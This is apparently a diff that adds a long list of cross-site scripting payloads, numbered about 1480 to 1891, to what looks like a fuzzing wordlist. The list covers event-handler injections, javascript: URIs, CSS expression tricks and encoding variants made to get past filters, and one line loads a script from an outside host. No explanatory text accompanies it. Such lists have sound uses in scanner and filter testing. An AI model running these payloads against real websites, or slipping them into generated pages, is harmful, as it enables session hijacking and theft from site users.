+<body onscroll=javascript:alert(1480)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form id=test onforminput=javascript:alert(1481)><input></form><button form=test onformchange=javascript:alert(1481)>X
+<video><source onerror="javascript:javascript:alert(1482)">
+<video onerror="javascript:javascript:alert(1483)"><source>
+<form><button formaction="javascript:javascript:alert(1484)">X
+<body oninput=javascript:alert(1485)><input autofocus>
+<math href="javascript:javascript:alert(1486)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1486)">CLICKME</maction> </math>
+<frameset onload=javascript:alert(1487)>
+<table background="javascript:javascript:alert(1488)">
+<!--<img src="--><img src=x onerror=javascript:alert(1489)//">
+<comment><img src="</comment><img src=x onerror=javascript:alert(1490))//">
+<![><img src="]><img src=x onerror=javascript:alert(1491)//">
+<style><img src="</style><img src=x onerror=javascript:alert(1492)//">
+<li style=list-style:url() onerror=javascript:alert(1493)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1493)></div>
+<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1494)//#">XXX</a></body>
+<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1495)</SCRIPT>
+<OBJECT CLASSID="clsid:333C7BC4-460F-14961496D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1496)"></OBJECT>
+<b <script>alert(1497)</script>0
+<div id="div1498"><input value="``onmouseover=javascript:alert(1498)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1498").innerHTML;</script>
+<x '="foo"><x foo='><img src=x onerror=javascript:alert(1499)//'>
+<embed src="javascript:alert(1500)">
+<img src="javascript:alert(1501)">
+<image src="javascript:alert(1502)">
+<script src="javascript:alert(1503)">
+<div style=width:1504px;filter:glow onfilterchange=javascript:alert(1504)>x
+<? foo="><script>javascript:alert(1505)</script>">
+<! foo="><script>javascript:alert(1506)</script>">
+</ foo="><script>javascript:alert(1507)</script>">
+<? foo="><x foo='?><script>javascript:alert(1508)</script>'>">
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1509)</script>">
+<% foo><x foo="%><script>javascript:alert(1510)</script>">
+<div id=d><x xmlns="><iframe onload=javascript:alert(1511)"></div> <script>d.innerHTML=d.innerHTML</script>
+<img \x00src=x onerror="alert(1512)">
+<img \x47src=x onerror="javascript:alert(1513)">
+<img \x15141514src=x onerror="javascript:alert(1514)">
+<img \x15152src=x onerror="javascript:alert(1515)">
+<img\x47src=x onerror="javascript:alert(1516)">
+<img\x15170src=x onerror="javascript:alert(1517)">
+<img\x15183src=x onerror="javascript:alert(1518)">
+<img\x32src=x onerror="javascript:alert(1519)">
+<img\x47src=x onerror="javascript:alert(1520)">
+<img\x15211521src=x onerror="javascript:alert(1521)">
+<img \x47src=x onerror="javascript:alert(1522)">
+<img \x34src=x onerror="javascript:alert(1523)">
+<img \x39src=x onerror="javascript:alert(1524)">
+<img \x00src=x onerror="javascript:alert(1525)">
+<img src\x09=x onerror="javascript:alert(1526)">
+<img src\x15270=x onerror="javascript:alert(1527)">
+<img src\x15283=x onerror="javascript:alert(1528)">
+<img src\x32=x onerror="javascript:alert(1529)">
+<img src\x15302=x onerror="javascript:alert(1530)">
+<img src\x15311531=x onerror="javascript:alert(1531)">
+<img src\x00=x onerror="javascript:alert(1532)">
+<img src\x47=x onerror="javascript:alert(1533)">
+<img src=x\x09onerror="javascript:alert(1534)">
+<img src=x\x15350onerror="javascript:alert(1535)">
+<img src=x\x15361536onerror="javascript:alert(1536)">
+<img src=x\x15372onerror="javascript:alert(1537)">
+<img src=x\x15383onerror="javascript:alert(1538)">
+<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1539)">
+<img src=x onerror=\x09"javascript:alert(1540)">
+<img src=x onerror=\x15410"javascript:alert(1541)">
+<img src=x onerror=\x15421542"javascript:alert(1542)">
+<img src=x onerror=\x15432"javascript:alert(1543)">
+<img src=x onerror=\x32"javascript:alert(1544)">
+<img src=x onerror=\x00"javascript:alert(1545)">
+<a href=java&#1546&#2&#3&#4&#5&#6&#7&#8&#15461546&#15462script:javascript:alert(1546)>XXX</a>
+<img src="x` `<script>javascript:alert(1547)</script>"` `>
+<img src onerror /" '"= alt=javascript:alert(1548)//">
+<title onpropertychange=javascript:alert(1549)></title><title title=>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1550)></a>">
+<!--[if]><script>javascript:alert(1551)</script -->
+<!--[if<img src=x onerror=javascript:alert(1552)//]> -->
+<object id="x" classid="clsid:CB927D15532-4FF7-4a9e-A155369-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C15537-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1553)" style="behavior:url(#x);"><param name=postdomevents /></object>
+<a style="-o-link:'javascript:javascript:alert(1554)';-o-link-source:current">X
+<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1555)'}{}*{-o-link-source:current}]{color:red};</style>
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1556))%7d
+<style>@import "data:,*%7bx:expression(javascript:alert(1557))%7D";</style>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1558);">XXX</a></a><a href="javascript:javascript:alert(1558)">XXX</a>
+<// style=x:expression\28javascript:alert(1559)\29>
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1560))}</style>
+<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1561));">X
+<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1562)}}).$=eval</script>
+<script>({0:#0=eval/#0#/#0#(javascript:alert(1563))})</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1564)}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1565)')()</script>
+<meta charset="mac-farsi">¼script¾javascript:alert(1566)¼/script¾
+X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1567)` >
+1568<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41568vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1568)&gt;`>
+1569<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1569)&gt;>
+1570<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1570) strokecolor=white strokeweight=1570000px from=0 to=1570000 /></a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1571)">XXX</a>
+<event-source src="%(event)s" onload="javascript:alert(1572)">
+<a href="javascript:javascript:alert(1573)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#15741574;src=x:x&#15741574;onerror&#15741574;=javascript:alert(1574)&gt;">
+<script>javascript:alert(1575)</script>
+<IMG SRC="javascript:javascript:alert(1576);">
+<IMG SRC=javascript:javascript:alert(1577)>
+<IMG SRC=`javascript:javascript:alert(1578)`>
+<FRAMESET><FRAME SRC="javascript:javascript:alert(1579);"></FRAMESET>
+<BODY ONLOAD=javascript:alert(1580)>
+<BODY ONLOAD=javascript:javascript:alert(1581)>
+<IMG SRC="jav ascript:javascript:alert(1582);">
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1583)>
+<IMG SRC="javascript:javascript:alert(1584)"
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1585);">
+<IMG DYNSRC="javascript:javascript:alert(1586)">
+<IMG LOWSRC="javascript:javascript:alert(1587)">
+<BGSOUND SRC="javascript:javascript:alert(1588);">
+<BR SIZE="&{javascript:alert(1589)}">
+<LINK REL="stylesheet" HREF="javascript:javascript:alert(1590);">
+<STYLE>li {list-style-image: url("javascript:javascript:alert(1591)");}</STYLE><UL><LI>XSS
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1592);">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1593);">
+<IFRAME SRC="javascript:javascript:alert(1594);"></IFRAME>
+<TABLE BACKGROUND="javascript:javascript:alert(1595)">
+<TABLE><TD BACKGROUND="javascript:javascript:alert(1596)">
+<DIV STYLE="background-image: url(javascript:javascript:alert(1597))">
+<DIV STYLE="width:expression(javascript:alert(1598));">
+<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1599))">
+<XSS STYLE="xss:expression(javascript:alert(1600))">
+<STYLE TYPE="text/javascript">javascript:alert(1601);</STYLE>
+<STYLE>.XSS{background-image:url("javascript:javascript:alert(1602)");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1603)")}</STYLE>
+<!--[if gte IE 4]><SCRIPT>javascript:alert(1604);</SCRIPT><![endif]-->
+<BASE HREF="javascript:javascript:alert(1605);//">
+<OBJECT classid=clsid:ae24fdae-03c6-16061606d1606-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1606)></OBJECT>
+<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1607)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1608)&lt;/SCRIPT&gt;"></BODY></HTML>
+<form id="test" /><button form="test" formaction="javascript:javascript:alert(1609)">X
+<body onscroll=javascript:alert(1610)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1611)">
+<STYLE>a{background:url('s1612' 's2)}@import javascript:javascript:alert(1612);');}</STYLE>
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1613)&&;&&<&&/script&&>
+<SCRIPT onreadystatechange=javascript:javascript:alert(1614);></SCRIPT>
+<style onreadystatechange=javascript:javascript:alert(1615);></style>
+<?xml version="1616.0"?><html:html xmlns:html='http://www.w3.org/1616999/xhtml'><html:script>javascript:alert(1616);</html:script></html:html>
+<embed code=javascript:javascript:alert(1617);></embed>
+<frameset onload=javascript:javascript:alert(1618)></frameset>
+<object onerror=javascript:javascript:alert(1619)>
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1620);">]]</C><X></xml>
+<IMG SRC=&{javascript:alert(1621);};>
+<a href="jav&#65ascript:javascript:alert(1622)">test1622</a>
+<a href="jav&#97ascript:javascript:alert(1623)">test1623</a>
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1624)&amp;gt;>">
+';alert(1625))//';alert(1625))//";
+alert(1626))//";alert(1626))//--
+></SCRIPT>">'><SCRIPT>alert(1627))</SCRIPT>
+<IMG SRC="javascript:alert(1628);">
+<IMG SRC=javascript:alert(1629)>
+<IMG SRC=JaVaScRiPt:alert(1630)>
+<IMG SRC=javascript:alert(1631)>
+<IMG SRC=`javascript:alert(1632)`>
+<a onmouseover="alert(1633)">xxs link</a>
+<a onmouseover=alert(1634)>xxs link</a>
+<IMG """><SCRIPT>alert(1635)</SCRIPT>">
+<IMG SRC=javascript:alert(1636))>
+<IMG SRC=# onmouseover="alert(1637)">
+<IMG SRC= onmouseover="alert(1638)">
+<IMG onmouseover="alert(1639)">
+<IMG SRC="jav ascript:alert(1640);">
+<IMG SRC="jav&#x09;ascript:alert(1641);">
+<IMG SRC="jav&#x0A;ascript:alert(1642);">
+<IMG SRC="jav&#x0D;ascript:alert(1643);">
+perl -e 'print "<IMG SRC=java\0script:alert(1644)>";' > out
+<IMG SRC=" &#14;  javascript:alert(1645);">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1646)>
+<<SCRIPT>alert(1647);//<</SCRIPT>
+<IMG SRC="javascript:alert(1648)"
+\";alert(1649);//
+</TITLE><SCRIPT>alert(1650);</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert(1651);">
+<BODY BACKGROUND="javascript:alert(1652)">
+<IMG DYNSRC="javascript:alert(1653)">
+<IMG LOWSRC="javascript:alert(1654)">
+<STYLE>li {list-style-image: url("javascript:alert(1655)");}</STYLE><UL><LI>XSS</br>
+<BODY ONLOAD=alert(1656)>
+<BGSOUND SRC="javascript:alert(1657);">
+<BR SIZE="&{alert(1658)}">
+<LINK REL="stylesheet" HREF="javascript:alert(1659);">
+<STYLE>@im\port'\ja\vasc\ript:alert(1660)';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert(1661))">
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert(1662))'>
+<STYLE TYPE="text/javascript">alert(1663);</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert(1664)");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert(1665)")}</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:alert(1666)")}</STYLE>
+<XSS STYLE="xss:expression(alert(1667))">
+¼script¾alert(1668)¼/script¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1669);">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1670);">
+<IFRAME SRC="javascript:alert(1671);"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(1672)"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert(1673);"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert(1674)">
+<TABLE><TD BACKGROUND="javascript:alert(1675)">
+<DIV STYLE="background-image: url(javascript:alert(1676))">
+<DIV STYLE="background-image: url(&#1;javascript:alert(1677))">
+<DIV STYLE="width: expression(alert(1678));">
+<BASE HREF="javascript:alert(1679);//">
+<? echo('<SCR)';echo('IPT>alert(1680)</SCRIPT>'); ?>
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(1681)</SCRIPT>">
+ <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(1682);+ADw-/SCRIPT+AD4-
+<img src=``&NewLine; onerror=alert(1683)&NewLine;
+<script /**/>/**/alert(1684)/**/</script /**/
+<iframe/src="data:text/html,<svg &#168516851685;&#168516850;load=alert(1685)>">
+<meta content="&NewLine; 1686 &NewLine;; JAVASCRIPT&colon; alert(1686)" http-equiv="refresh"/>
+<form><iframe &#09;&#16870;&#16871687; src="javascript&#58;alert(1687)"&#16871687;&#16870;&#09;;>
+http://www.google<script .com>alert(1688)</script
+<script ^__^>alert(1689))</script ^__^
+</style &#32;><script &#32; :-(>/**/alert(1690)/**/</script &#32; :-(
+&#00;</form><input type&#61691;"date" onfocus="alert(1691)">
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1692)&NewLine;>X</a>
+<script ~~~>alert(1693)</script ~~~>
+<iframe// src=javaSCRIPT&colon;alert(1694)
+<%<!--'%><script>alert(1695);</script -->
+<script src="data:text/javascript,alert(1696)"></script>
+<iframe/onreadystatechange=alert(1697)
+<svg/onload=alert(1698)
+<input type="text" value=`` <div/onmouseover='alert(1699)'>X</div>
+<img src=`xx:xx`onerror=alert(1700)>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1701)"/>
+<script>+-+-1702-+-+alert(1702)</script>
+<body/onload=&lt;!--&gt;&#17030alert(1703)>
+<script itworksinallbrowsers>/*<script* */alert(1704)</script
+<img src ?itworksonchrome?\/onerror = alert(1705)
+<svg><script onlypossibleinopera:-)> alert(1706)
+<script x> alert(1707) </script 1707=2
+<div/onmouseover='alert(1708)'> style="x:">
+<--`<img/src=` onerror=alert(1709)> --!>
+<div style="position:absolute;top:0;left:0;width:171000%;height:171000%" onmouseover="prompt(1710)" onclick="alert(1710)">x</button>
+<form><button formaction=javascript&colon;alert(1711)>CLICKME
+<script>alert(1712);</script>
+<script>alert(1713);</script>
+<IMG SRC="javascript:alert(1714);">
+<IMG SRC=javascript:alert(1715)>
+<IMG SRC=javascript:alert(1716)>
+<IMG SRC=javascript:alert(1717)>
+<IMG """><SCRIPT>alert(1718)</SCRIPT>">
+<scr<script>ipt>alert(1719);</scr</script>ipt>
+<script>alert(1720))</script>
+<img src=foo.png onerror=alert(1721) />
+<style>@im\port'\ja\vasc\ript:alert(1722)';</style>
+<? echo('<scr)'; echo('ipt>alert(1723)</script>'); ?>
+<marquee><script>alert(1724)</script></marquee>
+<IMG SRC=\"jav&#x09;ascript:alert(1725);\">
+<IMG SRC=\"jav&#x0A;ascript:alert(1726);\">
+<IMG SRC=\"jav&#x0D;ascript:alert(1727);\">
+<IMG SRC=javascript:alert(1728))>
+"><script>alert(1729)</script>
+</title><script>alert(1730)</script>
+</textarea><script>alert(1731)</script>
+<IMG LOWSRC=\"javascript:alert(1732)\">
+<IMG DYNSRC=\"javascript:alert(1733)\">
+<font style='color:expression(alert(1734))'>
+<img src="javascript:alert(1735)">
+<script language="JavaScript">alert(1736)</script>
+<body onunload="javascript:alert(1737);">
+<body onLoad="alert(1738);"
+[color=red' onmouseover="alert(1739)"]mouse over[/color]
+"/></a></><img src=1740.gif onerror=alert(1740)>
+window.alert(1741);
+alert(1742));'))">
+<iframe<?php echo chr(11)?> onload=alert(1743)></iframe>
+"><script alert(1744))</script>
+'">><script>alert(1745)</script>
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(1746);\">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert(1747);\">
+<script>1748 1748 = 1; alert(1748)</script>
+<STYLE type="text/css">BODY{background:url("javascript:alert(1749)")}</STYLE>
+<?='<SCRIPT>alert(1750)</SCRIPT>'?>
+" onfocus=alert(1751) "> <"
+<FRAMESET><FRAME SRC=\"javascript:alert(1752);\"></FRAMESET>
+<STYLE>li {list-style-image: url(\"javascript:alert(1753)\");}</STYLE><UL><LI>XSS
+perl -e 'print \"<SCR\0IPT>alert(1754)</SCR\0IPT>\";' > out
+perl -e 'print \"<IMG SRC=java\0script:alert(1755)>\";' > out
+<br size=\"&{alert(1756)}\">
+<scrscriptipt>alert(1757)</scrscriptipt>
+</script><script>alert(1759)</script>
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1760)>
+[color=red width=expression(alert(1761))][color]
+<BASE HREF="javascript:alert(1762);//">
+"></iframe><script>alert(1763)</script>
+<body onLoad="while(true) alert(1764);">
+'"></title><script>alert(1765)</script>
+</textarea>'"><script>alert(1766)</script>
+'""><script language="JavaScript"> alert(1767);</script>
+</script></script><<<<script><>>>><<<script>alert(1768)</script>
+<INPUT TYPE="IMAGE" SRC="javascript:alert(1769);">
+'></select><script>alert(1770)</script>
+a="get";b="URL";c="javascript:";d="alert(1771);";eval(a+b+c+d);
+='><script>alert(1772)</script>
+<body background=javascript:'"><script>alert(1773)</script>></body>
+">/XaDoS/><script>alert(1774)</script><script src="http://www.site.com/XSS.js"></script>
+">/KinG-InFeT.NeT/><script>alert(1775)</script>
+!--" /><script>alert(1776);</script>
+<script>alert(1777)</script><marquee><h1>XSS by xss</h1></marquee>
+"><script>alert(1778)</script>><marquee><h1>XSS by xss</h1></marquee>
+'"></title><script>alert(1779)</script>><marquee><h1>XSS by xss</h1></marquee>
+<img """><script>alert(1780)</script><marquee><h1>XSS by xss</h1></marquee>
+<script>alert(1781)</script><marquee><h1>XSS by xss</h1></marquee>
+"><script>alert(1782)</script>"><script>alert("XSS by \nxss</h1></marquee>
+'"></title><script>alert(1783)</script>><marquee><h1>XSS by xss</h1></marquee>
+<iframe src="javascript:alert(1784);"></iframe><marquee><h1>XSS by xss</h1></marquee>
+'><SCRIPT>alert(1785))</SCRIPT><img src="" alt='
+"><SCRIPT>alert(1786))</SCRIPT><img src="" alt="
+\'><SCRIPT>alert(1787))</SCRIPT><img src="" alt=\'
+'); alert(1788); var x='
+\\'); alert(1789);var x=\'
+//--></SCRIPT><SCRIPT>alert(1790));
+>"><ScRiPt%20%0a%0d>alert(1791)%3B</ScRiPt>
+<SCRIPT> alert(1792); </SCRIPT>
+<BODY ONLOAD=alert(1793)>
+<BODY BACKGROUND="javascript:alert(1794)">
+<IMG SRC="javascript:alert(1795);">
+<IMG DYNSRC="javascript:alert(1796)">
+<IMG LOWSRC="javascript:alert(1797)">
+<INPUT TYPE="IMAGE" SRC="javascript:alert(1798);">
+<LINK REL="stylesheet" HREF="javascript:alert(1799);">
+<TABLE BACKGROUND="javascript:alert(1800)">
+<TD BACKGROUND="javascript:alert(1801)">
+<DIV STYLE="background-image: url(javascript:alert(1802))">
+<DIV STYLE="width: expression(alert(1803));">
+&apos;;alert(1804))//\&apos;;alert(1804))//&quot;;alert(1804))//\&quot;;alert(1804))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(1804))&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;alert(1805)&lt;/SCRIPT&gt;
+&lt;SCRIPT&gt;alert(1806))&lt;/SCRIPT&gt;
+&lt;BASE HREF=&quot;javascript:alert(1807);//&quot;&gt;
+&lt;BGSOUND SRC=&quot;javascript:alert(1808);&quot;&gt;
+&lt;BODY BACKGROUND=&quot;javascript:alert(1809);&quot;&gt;
+&lt;BODY ONLOAD=alert(1810)&gt;
+&lt;DIV STYLE=&quot;background-image: url(javascript:alert(1811))&quot;&gt;
+&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(1812))&quot;&gt;
+&lt;DIV STYLE=&quot;width: expression(alert(1813));&quot;&gt;
+&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(1814);&quot;&gt;&lt;/FRAMESET&gt;
+&lt;IFRAME SRC=&quot;javascript:alert(1815);&quot;&gt;&lt;/IFRAME&gt;
+&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(1816);&quot;&gt;
+&lt;IMG SRC=&quot;javascript:alert(1817);&quot;&gt;
+&lt;IMG SRC=javascript:alert(1818)&gt;
+&lt;IMG DYNSRC=&quot;javascript:alert(1819);&quot;&gt;
+&lt;IMG LOWSRC=&quot;javascript:alert(1820);&quot;&gt;
+&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(1821)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+%BCscript%BEalert(1822)%BC/script%BE
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(1823);&quot;&gt;
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(1824);&quot;&gt;
+&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(1825)&gt;&lt;/OBJECT&gt;
+a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(1826);&quot;)&quot;;&#10;eval(a+b+c+d);
+&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(1827);&lt;/STYLE&gt;
+&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(1828))&quot;&gt;
+&lt;XSS STYLE=&quot;xss:expression(alert(1829))&quot;&gt;
+&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(1830)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(1831)&quot;)}&lt;/STYLE&gt;
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(1832);&quot;&gt;
+&lt;TABLE BACKGROUND=&quot;javascript:alert(1833)&quot;&gt;&lt;/TABLE&gt;
+&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(1834)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(1835);&quot;&gt;]]&gt;
+&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(1836)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(1837)&lt;/SCRIPT&gt;&quot;&gt;
+&lt;BR SIZE=&quot;&amp;{alert(1838)}&quot;&gt;
+&lt;IMG SRC=JaVaScRiPt:alert(1839)&gt;
+&lt;IMG SRC=javascript:alert(1840)&gt;
+&lt;IMG SRC=`javascript:alert(1841)`&gt;
+&lt;IMG SRC=javascript:alert(1842))&gt;
+&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(1843);+ADw-/SCRIPT+AD4-
+\&quot;;alert(1844);//
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(1845);&lt;/SCRIPT&gt;
+&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(1846)&apos;;&lt;/STYLE&gt;
+&lt;IMG SRC=&quot;jav&#x09;ascript:alert(1847);&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(1848);&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(1849);&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(1850);&quot;&gt;
+perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(1851)>&quot;;&apos;&gt; out
+perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(1852)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out
+&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(1853);&quot;&gt;
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(1854)&gt;
+&lt;IMG SRC=&quot;javascript:alert(1855)&quot;
+&lt;&lt;SCRIPT&gt;alert(1856);//&lt;&lt;/SCRIPT&gt;
+&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(1857)&lt;/SCRIPT&gt;&quot;&gt;
+&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(1858)&gt;
+&lt;/script&gt;&lt;script&gt;alert(1859)&lt;/script&gt;
+&lt;scrscriptipt&gt;alert(1861)&lt;/scrscriptipt&gt;
+&lt;br size=\&quot;&amp;{alert(1862)}\&quot;&gt;
+perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(1863)&gt;\&quot;;&#039; &gt; out
+perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(1864)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(1865))>
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(1866))>
+<~/XSS STYLE=xss:expression(alert(1867))>
+"><script>alert(1868)</script>
+</XSS/*-*/STYLE=xss:e/**/xpression(alert(1869))>
+XSS/*-*/STYLE=xss:e/**/xpression(alert(1870))>
+XSS STYLE=xss:e/**/xpression(alert(1871))>
+</XSS STYLE=xss:expression(alert(1872))>
+';;alert(1873))//\';;alert(1873))//";;alert(1873))//\";;alert(1873))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(1873))<;/SCRIPT>;
+<;SCRIPT>;alert(1874)<;/SCRIPT>;
+<;SCRIPT>;alert(1875))<;/SCRIPT>;
+<;BASE HREF=";javascript:alert(1876);//";>;
+<;BGSOUND SRC=";javascript:alert(1877);";>;
+<;BODY BACKGROUND=";javascript:alert(1878);";>;
+<;BODY ONLOAD=alert(1879)>;
+<;DIV STYLE=";background-image: url(javascript:alert(1880))";>;
+<;DIV STYLE=";background-image: url(&;#1;javascript:alert(1881))";>;
+<;DIV STYLE=";width: expression(alert(1882));";>;
+<;FRAMESET>;<;FRAME SRC=";javascript:alert(1883);";>;<;/FRAMESET>;
+<;IFRAME SRC=";javascript:alert(1884);";>;<;/IFRAME>;
+<;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(1885);";>;
+<;IMG SRC=";javascript:alert(1886);";>;
+<;IMG SRC=javascript:alert(1887)>;
+<;IMG DYNSRC=";javascript:alert(1888);";>;
+<;IMG LOWSRC=";javascript:alert(1889);";>;
+<;STYLE>;li {list-style-image: url(";javascript:alert(1890)";);}<;/STYLE>;<;UL>;<;LI>;XSS
+%BCscript%BEalert(1891)%BC/script%BE
